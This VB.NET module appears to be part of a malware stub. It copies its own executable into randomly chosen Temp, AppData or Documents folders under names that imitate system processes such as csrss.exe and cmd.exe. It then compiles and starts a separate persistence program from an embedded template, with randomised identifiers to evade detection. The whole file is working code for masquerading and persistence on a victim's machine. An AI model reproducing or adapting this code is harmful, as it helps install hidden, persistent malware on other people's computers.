Imports System.CodeDom.Compiler
Imports System.IO
Module Initialization
    Private Function GenerateExecPath() As String
        Dim paths() As String = {
                My.Computer.FileSystem.SpecialDirectories.Temp,
                My.Computer.FileSystem.SpecialDirectories.AllUsersApplicationData,
                My.Computer.FileSystem.SpecialDirectories.MyDocuments
        }

        Dim folders() As String =
            {"Docs", "Programs", "Programs (x32)", "Nil", "TShare"}
        Dim exeNames() As String =
            {"csrss.exe", "mxservice.exe", "solx32.exe", "collect32.exe", "cmd.exe", "xconhost.exe"}

        Dim _directory As String = RandomElemFrom(paths) & "\" & RandomElemFrom(folders) & "\"
        Directory.CreateDirectory(_directory)

        Return _directory & RandomElemFrom(exeNames)
    End Function

    Private Function RandomString() As String
        Dim result As String = Path.GetRandomFileName().Split(".")(0)
        If Char.IsDigit(result(0)) Then Return RandomString()
        Return result
    End Function

    Private Function RandomElemFrom(array As Object()) As Object
        Dim randomNumber As New Random
        Return array(randomNumber.Next(0, array.Length))
    End Function

    Public Function Initialize() As Boolean
        Dim newStubExecutablePath As String = GenerateExecPath()
        Dim newPersistenceExecutablePath As String = GenerateExecPath()

        If File.Exists(newStubExecutablePath) Then File.Delete(newStubExecutablePath)
        ' Is this line really useful ? Could be overwritten by File.WriteAllBytes.

        File.WriteAllBytes(newStubExecutablePath, File.ReadAllBytes(Application.ExecutablePath))

        Dim templateCode As String = My.Resources.psource.Replace("FULLFILEPATH_", newStubExecutablePath)

        For Each r In {"PROCESS_", "EXCEPTION_"}
            templateCode = templateCode.Replace(r, RandomString())
        Next

        Dim compilerParameters As CompilerParameters = New CompilerParameters()
        compilerParameters.GenerateExecutable = True
        compilerParameters.OutputAssembly = newPersistenceExecutablePath

        compilerParameters.ReferencedAssemblies.AddRange(New String() {
                                                         "System.Web.Extensions.dll", "System.Runtime.dll",
                                                         "System.Windows.Forms.dll", "System.dll",
                                                         "System.Collections.dll", "System.Data.dll",
                                                         "System.Core.dll", "System.IO.dll",
                                                         "System.Linq.dll", "System.Net.Http.dll",
                                                         "System.Text.RegularExpressions.dll",
                                                         "mscorlib.dll"
                                                         })

        Dim compiler As CodeDomProvider = CodeDomProvider.CreateProvider("VB")
        Dim output As CompilerResults = compiler.CompileAssemblyFromSource(compilerParameters, templateCode)

        If output.Errors.Count > 0 Then
            MsgBox("eh salut")
            Return False
        Else
            Process.Start(newPersistenceExecutablePath)
            Return True
        End If
    End Function
End Module
